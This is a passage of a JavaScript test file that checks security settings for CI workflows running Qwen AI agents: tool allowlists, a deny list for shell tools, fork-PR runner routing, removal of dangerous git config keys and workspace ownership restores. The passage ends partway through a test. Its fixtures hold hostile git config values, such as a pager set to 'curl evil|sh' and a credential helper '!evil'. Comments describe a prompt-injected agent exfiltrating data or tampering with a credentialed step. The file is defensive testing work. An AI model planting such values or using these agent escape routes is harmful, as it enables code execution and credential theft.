// Regression guards for the security-critical invariants of the Qwen Triage
// workflow. These broke silently once already: the `settings_json:` input name
// was wrong (the action reads `settings:`), so it was dropped and the review
// agent ran with the full default toolset and no deny list. A future edit that
// renames the key back, weakens the deny list, loosens the fork-PR runner
// routing, or breaks the git exec-vector cleanup would have no other test to
// catch it — this file is that test.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { after, before, describe, it } from 'node:test';
import { fileURLToPath } from 'node:url';
import { parse } from 'yaml';

const workflowPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
  'qwen-triage.yml',
);
const doc = parse(readFileSync(workflowPath, 'utf8'));
const cacheProducerPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
  'npm-cache.yml',
);
const cacheProducerDoc = parse(readFileSync(cacheProducerPath, 'utf8'));
const prWorkflowPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  '..',
  '.qwen',
  'skills',
  'triage',
  'references',
  'pr-workflow.md',
);
const prSkill = readFileSync(prWorkflowPath, 'utf8');
const triageJob = doc.jobs.triage;
const steps = triageJob.steps;
const triageStep = steps.find((s) => s.id === 'triage');
const cleanStep = steps.find((s) => s.name === 'Clean stale agent state');
const triageOwnershipStep = steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const verifyJob = doc.jobs.verify;
const verifyOwnershipStep = verifyJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const tmuxJob = doc.jobs['tmux-testing'];
const tmuxOwnershipStep = tmuxJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);

const ciWorkflowPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
  'ci.yml',
);
const ciDoc = parse(readFileSync(ciWorkflowPath, 'utf8'));
const ciTestJob = ciDoc.jobs.test;
const ciOwnershipStep = ciTestJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const ciCleanStep = ciTestJob.steps.find(
  (s) => s.name === 'Clean stale .qwen before checkout',
);

const prReviewWorkflowPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
  'qwen-code-pr-review.yml',
);
const prReviewDoc = parse(readFileSync(prReviewWorkflowPath, 'utf8'));
const prReviewJob = prReviewDoc.jobs['review-pr'];
const prReviewOwnershipStep = prReviewJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const resolvePrJob = prReviewDoc.jobs['resolve-pr'];
const resolveConflictsStep = resolvePrJob.steps.find(
  (s) => s.id === 'resolve_conflicts',
);
const followupWorkflowPath = join(
  dirname(fileURLToPath(import.meta.url)),
  '..',
  'workflows',
  'qwen-issue-followup-bot.yml',
);
const followupDoc = parse(readFileSync(followupWorkflowPath, 'utf8'));
const followupStep = followupDoc.jobs['follow-up-issues'].steps.find(
  (s) => s.name === 'Run Qwen issue follow-up',
);
const ciWebShellJob = ciDoc.jobs.web_shell_e2e_smoke;
const ciWebShellOwnershipStep = ciWebShellJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);
const ciIntegrationJob = ciDoc.jobs.integration_cli;
const ciIntegrationOwnershipStep = ciIntegrationJob.steps.find(
  (s) => s.name === 'Restore workspace ownership',
);

// A probe that only checks .qwen/.git reports "healthy" on workspace-wide
// poisoning (root-owned node_modules/dist, no .qwen/.git) and skips the
// chown that main did unconditionally — checkout then fails with EACCES.
// Recovery must stay unconditional and run before checkout; these tests
// guard against re-adding the probe gating, the inert rename-aside
// fallback, or moving the restore below the checkout step.
const assertUnconditional = (jobSteps, step, label) => {
  assert.ok(step, `${label} must have a "Restore workspace ownership" step`);
  assert.match(
    step.run,
    /chown -R "\$RUNNER_UID:\$RUNNER_GID" "\$GITHUB_WORKSPACE"/,
    `${label} must restore ownership of the whole workspace`,
  );
  assert.match(
    step.run,
    /sudo -n chown -R "\$RUNNER_UID:\$RUNNER_GID" "\$GITHUB_WORKSPACE"/,
    `${label} must keep the sudo fallback that recovers root-owned files on a non-root runner`,
  );
  assert.match(
    step.run,
    /chmod -R u\+rwX "\$GITHUB_WORKSPACE"/,
    `${label} must restore write permission of the whole workspace`,
  );
  assert.doesNotMatch(
    step.run,
    /recovery_needed|\.probe\./,
    `${label} must not gate recovery behind a .qwen/.git probe — poisoning is workspace-wide`,
  );
  assert.doesNotMatch(
    step.run,
    /\.stale\./,
    `${label} must not rename dirs aside — the rename-aside fallback never unblocks checkout`,
  );
  const restoreIdx = jobSteps.indexOf(step);
  const checkoutIdx = jobSteps.findIndex((s) => /^Checkout/.test(s.name));
  assert.ok(
    restoreIdx !== -1 && checkoutIdx !== -1 && restoreIdx < checkoutIdx,
    `${label} ownership restore must run before checkout`,
  );
};

// Unknown action inputs are dropped without error — that is how the
// settings_json bug survived in three workflows. Every agent step must pass
// this contract before its settings are even read; callers pin their own
// values on the returned object.
const assertSettingsContract = (step, label) => {
  assert.ok(step, `${label} must keep its agent step`);
  assert.ok(
    typeof step.with?.settings === 'string',
    `${label} must pass a \`settings\` string`,
  );
  assert.equal(
    step.with.settings_json,
    undefined,
    `${label}: \`settings_json\` is silently ignored by the action — never use it`,
  );
  const settings = JSON.parse(step.with.settings);
  // v1 top-level keys only work through runtime migration; write the native
  // v2 shape (the qwen-triage.yml convention).
  for (const key of ['coreTools', 'maxSessionTurns', 'sandbox']) {
    assert.equal(
      settings[key],
      undefined,
      `${label}: v1 top-level \`${key}\` is a legacy key — use the v2 shape`,
    );
  }
  return settings;
};

describe('qwen-triage: agent tool/permission settings', () => {
  it('passes `settings:` (not the silently-dropped `settings_json:`)', () => {
    assertSettingsContract(triageStep, 'triage step (id: triage)');
  });

  it('settings is valid JSON that restricts the toolset', () => {
    const settings = assertSettingsContract(triageStep, 'triage settings');
    const core = settings.tools?.core;
    assert.ok(
      Array.isArray(core),
      'tools.core must be an array (registration allowlist)',
    );
    for (const t of [
      'run_shell_command',
      'read_file',
      'grep_search',
      'glob',
      'write_file',
      'agent',
      'enter_worktree',
      'exit_worktree',
    ]) {
      assert.ok(core.includes(t), `tools.core must include ${t}`);
    }
    // The whitelist exists to drop network/persistence tools an injected agent
    // could exfiltrate through — they must not be registered.
    for (const forbidden of ['web_fetch', 'web_search', 'save_memory']) {
      assert.ok(
        !core.includes(forbidden),
        `tools.core must NOT register ${forbidden}`,
      );
    }
  });

  it('settings denies interpreters, network, and PR-code-materializing git/gh', () => {
    const settings = assertSettingsContract(triageStep, 'triage settings');
    const deny = settings.permissions?.deny ?? [];
    for (const d of [
      'run_shell_command(node)',
      'run_shell_command(npm)',
      'run_shell_command(bash)',
      'run_shell_command(curl)',
      'run_shell_command(git fetch)',
      'run_shell_command(git checkout)',
      'run_shell_command(gh pr checkout)',
    ]) {
      assert.ok(deny.includes(d), `permissions.deny must include ${d}`);
    }
    // No sandbox key: the ECS pool ships no container runtime, and adding one
    // would silently disable the step.
    assert.equal(
      settings.sandbox,
      undefined,
      'settings must not set a sandbox key',
    );
  });
});

// The same settings_json → settings bug survived in two more workflows after
// the triage fix. An unknown action input is dropped without error, so the
// /resolve agent ran every time with no turn cap and no tool allowlist, and
// the follow-up bot ran uncapped too. These blocks were therefore never
// validated by anything; parse them here.
//
// The sandbox key is pinned to FALSE, not true. The fix that made the block
// take effect (#9252) also switched the container on, and /resolve went from
// 84% pushed to 0 of 81 in a row: the versioned ghcr image lags the npm
// release (#9898) so the agent died at startup, or it hung silently to the job
// timeout. No sandboxed /resolve run has ever pushed a resolution.
describe('qwen-code-pr-review.yml resolve-pr: agent settings', () => {
  // The agent is a direct `qwen` invocation (no qwen-code-action), so the
  // settings travel as a step env value that the run block writes to a
  // per-run QWEN_HOME — nothing can be silently dropped by an input name.
  const resolveSettings = (label) => {
    assert.ok(resolveConflictsStep, `${label} must keep its agent step`);
    assert.equal(
      resolveConflictsStep.uses,
      undefined,
      `${label} must invoke qwen directly, not through an action (its $GITHUB_ENV/$GITHUB_PATH cannot be decoyed)`,
    );
    const raw = resolveConflictsStep.env?.QWEN_SETTINGS;
    assert.ok(typeof raw === 'string', `${label} must carry QWEN_SETTINGS`);
    assert.ok(
      resolveConflictsStep.run.includes('> "$QWEN_HOME/settings.json"'),
      `${label} must write QWEN_SETTINGS to the per-run QWEN_HOME`,
    );
    const settings = JSON.parse(raw);
    for (const key of ['coreTools', 'maxSessionTurns', 'sandbox']) {
      assert.equal(
        settings[key],
        undefined,
        `${label}: v1 top-level \`${key}\` is a legacy key — use the v2 shape`,
      );
    }
    return settings;
  };

  it('writes its settings to a per-run QWEN_HOME instead of an action input', () => {
    resolveSettings('resolve_conflicts');
    assert.equal(resolveConflictsStep.with, undefined);
  });

  it('settings is valid JSON pinning the turn cap, allowlist, and sandbox', () => {
    const settings = resolveSettings('resolve_conflicts');
    assert.equal(
      settings.model?.maxSessionTurns,
      400,
      'model.maxSessionTurns must stay 400',
    );
    const core = settings.tools?.core;
    assert.ok(
      Array.isArray(core),
      'tools.core must be an array (registration allowlist)',
    );
    for (const t of [
      'read_file',
      'read_many_files',
      'glob',
      'search_file_content',
      'write_file',
      'run_shell_command(git merge)',
    ]) {
      assert.ok(core.includes(t), `tools.core must include ${t}`);
    }
    // Explicit false, not absent: absent means "whatever the CLI defaults to
    // or QWEN_SANDBOX says", and the one time this flipped on it took the
    // command down for 13 days (see the describe comment).
    assert.equal(
      settings.tools?.sandbox,
      false,
      'tools.sandbox must stay false — every sandboxed /resolve run has failed; re-enable only with a dry-run that finishes inside the container',
    );
  });

  it('pins the CLI version instead of following `latest`', () => {
    // `latest` ties the job to the npm release pipeline of the moment: on
    // 2026-08-15 the dist-tag pointed at an unresolvable 0.21.12 and every
    // /resolve died on `npm error notarget` before the agent started.
    const install = resolvePrJob.steps.find(
      (s) => s.name === 'Install Qwen CLI',
    );
    assert.ok(install, 'resolve-pr must install the CLI in its own step');
    assert.match(
      String(install.env?.QWEN_CLI_VERSION),
      /^\d+\.\d+\.\d+$/,
      'QWEN_CLI_VERSION must be an exact semver, not a dist-tag',
    );
    assert.ok(
      install.run.includes('@qwen-code/qwen-code@${QWEN_CLI_VERSION}'),
      'the install must use the pinned version',
    );
  });

  it('decoys the runner command files for the agent invocation', () => {
    // The agent has arbitrary shell; whatever it appends to $GITHUB_ENV or
    // $GITHUB_PATH would apply to the credentialed push step of the same
    // job. The invocation must see invocation-scoped decoys, inside a
    // parsing-off window, with no token in its environment.
    const run = resolveConflictsStep.run;
    for (const file of ['GITHUB_PATH', 'GITHUB_ENV', 'GITHUB_OUTPUT']) {
      assert.ok(
        run.includes(`${file}="$decoy_dir/`),
        `${file} must point at the decoy for the qwen invocation`,
      );
    }
    assert.ok(run.includes('echo "::stop-commands::${stop_token}"'));
    assert.ok(run.includes("printf '\\n::%s::\\n' \"$stop_token\""));
    assert.ok(run.includes('--approval-mode yolo'));
    for (const key of Object.keys(resolveConflictsStep.env)) {
      assert.ok(
        !/TOKEN|PAT/.test(key),
        `agent env must carry no credential, found ${key}`,
      );
    }
  });

  it('hardens every step that runs after the agent', () => {
    const steps = resolvePrJob.steps;
    const agentIdx = steps.findIndex((s) => s.id === 'resolve_conflicts');
    const later = steps.slice(agentIdx + 1).filter((s) => s.run);
    assert.ok(later.length >= 3, 'expected the post-agent run steps');
    for (const s of later) {
      if (s.name === 'Report skipped request') {
        // Only runs when the agent did not (decision != run).
        continue;
      }
      for (const line of [
        'PATH=/usr/bin:/bin',
        'export GIT_CONFIG_COUNT=0',
        'export GIT_CONFIG_SYSTEM=/dev/null',
        'export GIT_CONFIG_GLOBAL=/dev/null',
        'git() { command git -c core.hooksPath=/dev/null -c core.fsmonitor= -c credential.helper= "$@"; }',
      ]) {
        assert.ok(
          s.run.includes(line),
          `post-agent step '${s.name}' must open with the hardened tool environment: missing ${line}`,
        );
      }
    }
    // The workspace's own .git/config is the highest-precedence scope and the
    // agent writes the workspace: it is removed before any check runs.
    const verify = steps.find((s) => s.id === 'verify');
    assert.ok(verify.run.includes('rm -f .git/config'));
    for (const key of ['BASH_ENV', 'LD_PRELOAD', 'LD_AUDIT', 'LD_LIBRARY_PATH']) {
      assert.equal(verify.env[key], '', `verify must pin ${key} empty`);
    }
    const report = steps.find((s) => s.name === 'Report result');
    assert.ok(report.run.includes('rm -f .git/config'));
    assert.ok(report.run.includes('export GH_CONFIG_DIR'));
    assert.ok(report.run.includes('push --no-verify'));
  });

  it('keeps resolve-pr on an ephemeral hosted runner', () => {
    // This job merges the base branch and force-pushes to the PR head; a fresh
    // runner is the cheapest guarantee that nothing from an earlier attempt
    // is carried into the credentialed push. (It used to be pinned for docker
    // as well; the agent no longer runs sandboxed, so that half is moot.)
    assert.equal(
      resolvePrJob['runs-on'],
      'ubuntu-latest',
      'resolve-pr must stay on an ephemeral hosted runner',
    );
  });
});

describe('qwen-issue-followup-bot.yml: agent settings', () => {
  it('passes `settings:` (not the silently-dropped `settings_json:`)', () => {
    assertSettingsContract(followupStep, 'the follow-up step');
  });

  it('settings is valid JSON pinning the turn cap and gh allowlist', () => {
    const settings = assertSettingsContract(followupStep, 'the follow-up step');
    assert.equal(
      settings.model?.maxSessionTurns,
      50,
      'model.maxSessionTurns must stay 50',
    );
    const core = settings.tools?.core;
    assert.ok(
      Array.isArray(core),
      'tools.core must be an array (registration allowlist)',
    );
    for (const t of [
      'run_shell_command(gh issue view)',
      'run_shell_command(gh issue comment)',
    ]) {
      assert.ok(core.includes(t), `tools.core must include ${t}`);
    }
    // follow-up-issues routes to the self-hosted ECS pool by default, which
    // ships no container runtime; sandbox: true would kill the agent at
    // startup (exit 44) on every ECS-routed run.
    assert.equal(
      settings.tools?.sandbox,
      false,
      'tools.sandbox must stay false — the ECS pool has no container runtime',
    );
  });
});

describe('qwen-triage: fork-PR runner routing', () => {
  const runsOn = String(triageJob['runs-on']);
  const authorizeJob = doc.jobs.authorize;
  const authorizeRunsOn = String(authorizeJob['runs-on']);

  it('routes the ECS pool on same-repo or a REAL write-permission check', () => {
    assert.match(runsOn, /head\.repo\.full_name == github\.repository/);
    // The boundary is the collaborator-permission lookup authorize computes,
    // NOT the coarse author_association: MEMBER admits any org member and
    // COLLABORATOR admits read-only invitees — neither implies write access
    // on this repo, and this job's agent loads bot PATs and a model key.
    assert.match(
      runsOn,
      /needs\.authorize\.outputs\.author_can_write == 'true'/,
    );
    assert.doesNotMatch(runsOn, /author_association/);
    assert.match(runsOn, /ecs-qwen/);
  });

  it('keeps the authorize gate itself on the same-repo guard', () => {
    // authorize IS the permission check (and loads CI_BOT_PAT); it cannot
    // route on its own output and must not widen to association-based trust.
    assert.match(
      authorizeRunsOn,
      /head\.repo\.full_name == github\.repository/,
    );
    assert.doesNotMatch(authorizeRunsOn, /author_association/);
    assert.doesNotMatch(authorizeRunsOn, /needs\./);
  });

  it('computes author_can_write from the collaborator-permission API', () => {
    assert.equal(
      authorizeJob.outputs.author_can_write,
      '${{ steps.perm.outputs.author_can_write }}',
    );
    const perm = authorizeJob.steps.find((s) => s.id === 'perm');
    assert.ok(
      String(perm.env.PR_AUTHOR).includes(
        'github.event.pull_request.user.login',
      ),
    );
    assert.match(perm.run, /collaborators\/\$\{PR_AUTHOR\}\/permission/);
    assert.match(
      perm.run,
      /admin\|maintain\|write\) echo "author_can_write=true"/,
    );
  });

  it('falls back to an ephemeral hosted runner', () => {
    assert.match(runsOn, /ubuntu-latest/);
  });

  it('keeps issue triage on ECS (issues carry no foreign code)', () => {
    assert.match(runsOn, /github\.event_name == 'issues'/);
  });
});

describe('qwen-triage: git exec-vector cleanup', () => {
  it('exists and uses a keep-known-safe allowlist (invert-match), not a denylist', () => {
    assert.ok(cleanStep, "'Clean stale agent state' step must exist");
    assert.match(cleanStep.run, /git config --local --name-only --list/);
    assert.match(cleanStep.run, /grep -ivE/, 'must invert-match an allowlist');
    assert.match(cleanStep.run, /--unset-all/);
  });

  it('sweeps symlinked hooks, not just regular files', () => {
    assert.match(
      cleanStep.run,
      /-type f\s+-o\s+-type l/,
      'hook find must match -type f OR -type l (a symlinked hook survives a bare -type f)',
    );
  });

  // Steady-state regression: on a reused runner this step has already
  // sanitized the config, so the next run's grep matches nothing and exits 1.
  // Under the Actions default `bash -e` shell plus the script's own
  // `set -o pipefail`, an unguarded grep killed the whole step exactly when
  // there was nothing to clean (run 30095456731). The allowlist test below
  // can't catch this: it re-assembles the pipeline without the shell flags
  // and always plants non-allowlisted keys. So run the *actual* step script
  // under the actual flags against the nothing-to-clean state.
  describe('steady state: nothing to clean (real step script, bash -e)', () => {
    // The stage-draft cleanup touches a literal /tmp glob; neuter that one
    // line so the test never deletes files outside its scratch dir.
    const hermetic = cleanStep.run.replace(/^rm -f \/tmp\/stage-[^\n]*$/m, ':');
    let dir;

    before(() => {
      assert.notEqual(hermetic, cleanStep.run, 'stage-draft rm line not found');
      dir = mkdtempSync(join(tmpdir(), 'triage-steady-'));
      spawnSync('git', ['-C', dir, 'init', '-q']);
    });

    after(() => dir && rmSync(dir, { recursive: true, force: true }));

    const runStep = (script) =>
      spawnSync('bash', ['-e', '-c', script], {
        cwd: dir,
        encoding: 'utf8',
        env: { ...process.env, RUNNER_TEMP: join(dir, 'rt') },
      });

    it('succeeds when every config key is already allowlisted', () => {
      const res = runStep(hermetic);
      assert.equal(res.status, 0, res.stderr || res.stdout);
      assert.match(res.stdout, /stale agent state cleaned/);
    });

    it('negative control: without the grep guard the same state kills the step', () => {
      const unguarded = hermetic.replace(' || true; }', '; }');
      assert.notEqual(
        unguarded,
        hermetic,
        'grep guard (`|| true`) not found in clean step',
      );
      assert.notEqual(runStep(unguarded).status, 0);
    });
  });

  // Behavioral test: run the workflow's *actual* allowlist pattern (extracted
  // from the step) against a scratch repo. Proves the regex both unsets exec
  // vectors and preserves the plumbing actions/checkout needs — a broken
  // pattern (e.g. accidentally allowing `filter.`, or dropping `remote.`) fails
  // here even though the structural assertions above still pass.
  describe('allowlist behavior (workflow pattern, real git)', () => {
    const patternMatch = cleanStep.run.match(/grep -ivE '([^']+)'/);
    let dir;

    before(() => {
      assert.ok(
        patternMatch,
        'clean step must contain a single-quoted `grep -ivE` allowlist',
      );
      dir = mkdtempSync(join(tmpdir(), 'triage-cfg-'));
      const set = (k, v) =>
        spawnSync('git', ['-C', dir, 'config', '--local', k, v]);
      spawnSync('git', ['-C', dir, 'init', '-q']);
      // plumbing actions/checkout needs (must survive)
      set('core.repositoryformatversion', '0');
      set('remote.origin.url', 'https://github.com/x/y');
      set('remote.origin.fetch', '+refs/heads/*:refs/remotes/origin/*');
      set('branch.main.remote', 'origin');
      set('safe.directory', dir);
      set('submodule.s.url', 'https://github.com/x/s');
      // exec vectors across every family (must be unset)
      set('core.hooksPath', '/evil');
      set('core.pager', 'curl evil|sh');
      set('core.fsmonitor', '/evil');
      set('filter.lfs.process', 'evil');
      set('url.https://evil/.insteadOf', 'https://github.com/');
      set('credential.helper', '!evil');
      set('includeIf.gitdir:/x/.path', '/evil');
      set('include.path', '/evil');
      set('alias.st', '!evil');
      set('submodule.s.update', '!cmd');
      set('sequence.editor', 'evil');
      set('diff.external', 'evil');
      // apply the workflow's own pipeline (real grep + git, not a JS re-impl)
      const script =
        'git config --local --name-only --list 2>/dev/null ' +
        `| grep -ivE '${patternMatch[1]}' ` +
        '| while IFS= read -r key; do git config --local --unset-all "$key" 2>/dev/null || true; done';
      const res = spawnSync('bash', ['-c', script], {
        cwd: dir,
        encoding: 'utf8',
        env: { ...process.env, GIT_DIR: join(dir, '.git') },
      });
      assert.equal(res.status, 0, res.stderr);
    });

    after(() => dir && rmSync(dir, { recursive: true, force: true }));

    const remaining = () =>
      spawnSync(
        'git',
        ['-C', dir, 'config', '--local', '--name-only', '--list'],
        {
          encoding: 'utf8',
        },
      ).stdout.toLowerCase();

    for (const vec of [
      'hookspath',
      'core.pager',
      'fsmonitor',
      'filter.',
      'url.https',
      'credential',
      'includeif',
      'include.path',
      'alias.',
      'submodule.s.update',
      'sequence.editor',
      'diff.external',
    ]) {
      it(`unsets exec vector: ${vec}`, () => {
        assert.doesNotMatch(remaining(), new RegExp(vec.replace(/\./g, '\\.')));
      });
    }

    for (const kept of [
      'core.repositoryformatversion',
      'remote.origin.url',
      'remote.origin.fetch',
      'branch.main.remote',
      'safe.directory',
      'submodule.s.url',
    ]) {
      it(`preserves checkout plumbing: ${kept}`, () => {
        assert.match(remaining(), new RegExp(kept.replace(/\./g, '\\.')));
      });
    }
  });
});

describe('qwen-triage: workspace ownership restore', () => {
  it('verify: restores write permission before returning the workspace to the runner', () => {
    assert.ok(verifyOwnershipStep, 'verify ownership-restore step must exist');
    assert.equal(
      verifyOwnershipStep.if,
      'always()',
      'ownership restore must run unconditionally — without always(), a failed/cancelled verify leaves root-owned files that break the next checkout',
    );
    assert.match(
      verifyOwnershipStep.run,
      /chmod -R u\+rwX "\$GITHUB_WORKSPACE"/,
      'verify hardens the workspace before the agent runs, so cleanup must restore owner write bits across the whole workspace, not just .qwen',
    );

    const chmodIndex = verifyOwnershipStep.run.indexOf(
      'chmod -R u+rwX "$GITHUB_WORKSPACE"',
    );
    const chownIndex = verifyOwnershipStep.run.indexOf(
      'chown -R "$RUNNER_UID:$RUNNER_GID" "$GITHUB_WORKSPACE"',
    );
    assert.ok(
      chmodIndex < chownIndex,
      'the root-owned read-only tree must be made writable before ownership is returned',
    );
    assert.match(
      verifyOwnershipStep.run,
      /stat -c '%u' "\$RUNNER_TEMP"/,
      'verify runs as root in a container; RUNNER_UID must come from stat on RUNNER_TEMP, not id -u (which returns 0 and skips the chown)',
    );
  });

  it('tmux-testing: returns ownership to the runner unconditionally', () => {
    assert.ok(
      tmuxOwnershipStep,
      'tmux-testing ownership-restore step must exist',
    );
    assert.equal(
      tmuxOwnershipStep.if,
      'always()',
      'ownership restore must run unconditionally — the prepare step chowns to node:node; without always(), a failed/cancelled run leaves node-owned files that break the next checkout',
    );
    assert.match(
      tmuxOwnershipStep.run,
      /chown -R "\$RUNNER_UID:\$RUNNER_GID" "\$GITHUB_WORKSPACE"/,
      'tmux-testing must return workspace ownership to the runner',
    );
    assert.match(
      tmuxOwnershipStep.run,
      /stat -c '%u' "\$RUNNER_TEMP"/,
      'tmux-testing runs as root in a container; RUNNER_UID must come from stat on RUNNER_TEMP, not id -u (which returns 0 and skips the chown)',
    );
  });

  it('verify: a chmod failure is visible, not silent', () => {
    assert.match(
      verifyOwnershipStep.run,
      /::warning::could not restore workspace write permissions/,
      'chmod failure must emit a ::warning::, not be swallowed by || true',
    );
  });

  it('verify: a chown failure is visible, not silent', () => {
    assert.match(
      verifyOwnershipStep.run,
      /::warning::could not restore workspace ownership/,
      'chown failure must emit a ::warning::, not be swallowed by || true',
    );
    assert.match(
      verifyOwnershipStep.run,
      /::warning::could not determine runner UID/,
      'a stat failure (UID=0 fallback) must emit a ::warning::, not silently skip the restore',
    );
  });

  it('tmux-testing: restores write permission as well as ownership', () => {
    assert.match(
      tmuxOwnershipStep.run,
      /chmod -R u\+rwX "\$GITHUB_WORKSPACE"/,
      'tmux-testing must chmod the workspace so a read-only tree does not survive the restore',
    );
  });

  it('tmux-testing: a chown failure is visible, not silent', () => {
    assert.match(
      tmuxOwnershipStep.run,
      /::warning::could not restore workspace ownership/,
      'chown failure must emit a ::warning::, not be swallowed by || true',
    );
    assert.match(
      tmuxOwnershipStep.run,
      /::warning::could not determine runner UID/,
      'a stat failure (UID=0 fallback) must emit a ::warning::, not silently skip the restore',
    );
  });

  it('triage: restores ownership before checkout on the ECS pool', () => {
    assertUnconditional(steps, triageOwnershipStep, 'qwen-triage triage');
  });
});

describe('ci.yml: self-hosted checkout jobs restore ownership unconditionally', () => {
  it('test job restores ownership unconditionally', () => {
    assertUnconditional(ciTestJob.steps, ciOwnershipStep, 'ci.yml test');
  });

  it('web_shell_e2e_smoke restores ownership unconditionally', () => {
    assertUnconditional(
      ciWebShellJob.steps,
      ciWebShellOwnershipStep,
      'ci.yml web_shell_e2e_smoke',
    );
  });

  it('integration_cli restores ownership unconditionally', () => {
    assertUnconditional(
      ciIntegrationJob.steps,
      ciIntegrationOwnershipStep,
      'ci.yml integration_cli',
    );
  });

  it('cleanup step removes .qwen but no longer any .stale.* dirs', () => {
    assert.ok(
      ciCleanStep,
      'ci.yml test job must keep its "Clean stale .qwen before checkout" step',
    );
    assert.match(
      ciCleanStep.run,
      /\$GITHUB_WORKSPACE\/\.qwen/,
      'cleanup must remove .qwen by absolute path',
    );
    assert.match(
      ciCleanStep.run,
      /sudo -n rm -rf/,
      'cleanup must fall back to sudo for root-owned dirs',
    );
    assert.match(
      ciCleanStep.run,
      /\[ -d "\$stale_qwen" \] && \[ ! -L "\$stale_qwen" \]/,
      'cleanup must not follow a symlinked qwen state: chmod -R dereferences a symlinked argument and would widen an outside tree',
    );
    assert.doesNotMatch(
      ciCleanStep.run,
      /\.stale\./,
      'cleanup must not reference .stale.* dirs once rename-aside is gone',
    );
  });
});

describe('qwen-code-pr-review.yml: ownership recovery is unconditional', () => {
  it('restores ownership without probe gating or rename-aside', () => {
    assertUnconditional(
      prReviewJob.steps,
      prReviewOwnershipStep,
      'qwen-code-pr-review.yml review-pr',
    );
  });
});

describe('qwen-triage: Stage 1e revert-pattern signals', () => {
  it('includes high-risk path detection', () => {
    assert.ok(prSkill.includes('1e. High-risk path'));
    assert.ok(prSkill.includes('openaiContentGenerator'));
    assert.ok(prSkill.includes('streamingToolCallParser'));
    assert.ok(prSkill.includes('geminiChat'));
    assert.ok(prSkill.includes('acpConnection'));
    assert.ok(prSkill.includes('(^|/)shell\\.ts$'));
    assert.ok(prSkill.includes('shellExecutionService'));
    assert.ok(prSkill.includes('mcp-client'));
    assert.ok(prSkill.includes('mcp-pool'));
    assert.ok(prSkill.includes('LspServer'));
    assert.ok(prSkill.includes('acp-integration'));
    assert.ok(prSkill.includes('(^|/)relaunch\\.ts$'));
    assert.ok(prSkill.includes('(^|/)sandbox\\.ts$'));
    assert.ok(prSkill.includes('electron-run-as-node'));
    assert.ok(prSkill.includes('p = 0.006'));
    assert.ok(prSkill.includes('do not skip any Stage 2 enrichment'));
    assert.ok(prSkill.includes('gh api --paginate'));
    assert.ok(prSkill.includes('|| true'));
    assert.ok(prSkill.includes('WARNING: could not fetch PR files'));
  });

  it('includes Risk field in the Stage 1 comment template', () => {
    assert.ok(prSkill.includes('Risk: <if Stage 1e matched'));
  });
});

describe('qwen-triage: npm cache restore-only invariant', () => {
  for (const [jobName, jobDef] of [
    ['verify', verifyJob],
    ['tmux-testing', tmuxJob],
  ]) {
    it(`${jobName}: uses actions/cache/restore with no save path`, () => {
      const cacheStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      assert.ok(cacheStep, `'Restore npm cache' step must exist in ${jobName}`);
      assert.match(
        cacheStep.uses,
        /^actions\/cache\/restore@/,
        'must use the restore-only variant (no post-save hook)',
      );
      for (const s of jobDef.steps) {
        if (s.uses) {
          assert.doesNotMatch(
            s.uses,
            /actions\/cache(\/save)?@/,
            `${jobName} must not have a cache save or full cache action`,
          );
        }
      }
    });

    it(`${jobName}: npm ci --cache matches the restored directory`, () => {
      const cacheStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      const prepareStep = jobDef.steps.find(
        (s) => s.name === 'Install and build PR app',
      );
      assert.ok(
        prepareStep,
        `'Install and build PR app' step must exist in ${jobName}`,
      );
      const dir = cacheStep.with.path.replace(
        /^\$\{\{\s*runner\.temp\s*\}\}\//,
        '',
      );
      assert.ok(dir, 'cache path must resolve to a directory name');
      assert.ok(
        prepareStep.run.includes(`--cache "$RUNNER_TEMP/${dir}"`),
        `npm ci must use --cache "$RUNNER_TEMP/${dir}"`,
      );
    });

    it(`${jobName}: clears stale npm cache before restore`, () => {
      const clearIdx = jobDef.steps.findIndex(
        (s) => s.name === 'Clear stale npm cache',
      );
      const restoreIdx = jobDef.steps.findIndex(
        (s) => s.name === 'Restore npm cache',
      );
      assert.ok(
        clearIdx !== -1,
        `'Clear stale npm cache' step must exist in ${jobName}`,
      );
      assert.ok(
        restoreIdx !== -1,
        `'Restore npm cache' step must exist in ${jobName}`,
      );
      assert.ok(
        clearIdx < restoreIdx,
        'clear step must come before restore step',
      );
      assert.match(
        jobDef.steps[clearIdx].run,
        /rm -rf/,
        'clear step must rm -rf the cache directory',
      );
      const cacheStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      const dir = cacheStep.with.path.replace(
        /^\$\{\{\s*runner\.temp\s*\}\}\//,
        '',
      );
      assert.ok(
        jobDef.steps[clearIdx].run.includes(`/${dir}"`),
        `clear step must remove the restored cache directory (${dir})`,
      );
    });

    it(`${jobName}: reports the cache hit so a permanent miss is visible`, () => {
      const cacheStep = jobDef.steps.find(
        (s) => s.name === 'Restore npm cache',
      );
      assert.equal(
        cacheStep.id,
        'npm-cache',
        'restore step needs an id so its cache-hit output is readable',
      );
      const reportStep = jobDef.steps.find(
        (s) => s.name === 'Report npm cache hit',
      );
      assert.ok(reportStep, "'Report npm cache hit' step must exist");
      assert.match(
        reportStep.run,
        /steps\.npm-cache\.outputs\.cache-hit/,
        'report step must surface the cache-hit output',
      );
    });
  }
});

describe('qwen-triage: npm cache producer workflow', () => {
  const saveJob = cacheProducerDoc.jobs.save;

  it('triggers on push to main only', () => {
    const push = cacheProducerDoc.on.push ?? cacheProducerDoc[true]?.push;
    assert.ok(push, 'must have a push trigger');
    assert.deepEqual(push.branches, ['main']);
    assert.deepEqual(push.paths, ['package-lock.json']);
  });

  it('saves with the same key and path the triage lanes restore', () => {
